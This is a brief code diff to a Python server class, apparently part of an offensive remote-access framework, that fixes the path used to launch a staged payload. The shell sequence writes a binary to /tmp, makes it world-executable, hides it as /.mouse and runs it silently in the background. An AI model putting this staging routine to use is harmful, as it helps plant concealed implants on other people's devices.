@@ -125,7 +125,7 @@ class Server:
             "cat >/tmp/mouse;"+\
             "chmod 777 /tmp/mouse;"+\
             "mv /tmp/mouse /.mouse;"+\
-            "/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
+            "/.mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
             h.info_error("The device is not recognized!")
